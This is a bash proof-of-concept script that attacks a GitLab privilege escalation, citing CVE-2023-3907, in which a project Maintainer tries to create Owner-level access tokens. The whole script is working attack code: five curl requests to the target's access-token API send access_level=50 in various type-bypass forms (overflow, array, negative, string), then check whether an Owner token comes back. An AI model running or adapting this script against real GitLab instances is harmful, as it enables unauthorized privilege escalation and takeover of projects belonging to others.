#!/bin/bash
# GitLab Project Access Token Privilege Escalation
# Reference: CVE-2023-3907 — shubham_sohi ($5k-$15k bounty)
# A Maintainer can create Owner-level access tokens via API bypass
#
# USAGE:
#   chmod +x 02-project-access-token-privesc.sh
#   ./02-project-access-token-privesc.sh <gitlab-url> <token> <project-id>

GITLAB_URL="${1:-https://gitlab.com}"
TOKEN="$2"
PROJECT_ID="$3"

if [ -z "$TOKEN" ] || [ -z "$PROJECT_ID" ]; then
    echo "Usage: $0 <gitlab-url> <private-token> <project-id>"
    echo "Example: $0 https://gitlab.com glpat-abc123 12345"
    exit 1
fi

echo "[*] Target: $GITLAB_URL"
echo "[*] Project ID: $PROJECT_ID"
echo ""
echo "[*] Testing access_level=50 (Owner) bypass..."

# Test 1: Direct Owner level
echo ""
echo "--- Test 1: access_level=50 ---"
curl -s -X POST "$GITLAB_URL/api/v4/projects/$PROJECT_ID/access_tokens" \
  -H "PRIVATE-TOKEN: $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"privesc-test-1","access_level":50,"scopes":["api"]}' | jq .

# Test 2: Integer overflow
echo ""
echo "--- Test 2: access_level=9999999 (overflow) ---"
curl -s -X POST "$GITLAB_URL/api/v4/projects/$PROJECT_ID/access_tokens" \
  -H "PRIVATE-TOKEN: $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"privesc-test-2","access_level":9999999,"scopes":["api"]}' | jq .

# Test 3: Array bypass
echo ""
echo "--- Test 3: access_level[]=50 (array) ---"
curl -s -X POST "$GITLAB_URL/api/v4/projects/$PROJECT_ID/access_tokens" \
  -H "PRIVATE-TOKEN: $TOKEN" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'name=privesc-test-3&access_level[]=50&scopes[]=api' | jq .

# Test 4: Negative value
echo ""
echo "--- Test 4: access_level=-1 (negative) ---"
curl -s -X POST "$GITLAB_URL/api/v4/projects/$PROJECT_ID/access_tokens" \
  -H "PRIVATE-TOKEN: $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"privesc-test-4","access_level":-1,"scopes":["api"]}' | jq .

# Test 5: String bypass
echo ""
echo "--- Test 5: access_level=\"50\" (string) ---"
curl -s -X POST "$GITLAB_URL/api/v4/projects/$PROJECT_ID/access_tokens" \
  -H "PRIVATE-TOKEN: $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"privesc-test-5","access_level":"50","scopes":["api"]}' | jq .

echo ""
echo "[*] Done. Check results above."
echo "[*] If any returned access_level=50 with a token value -> VULNERABLE!"
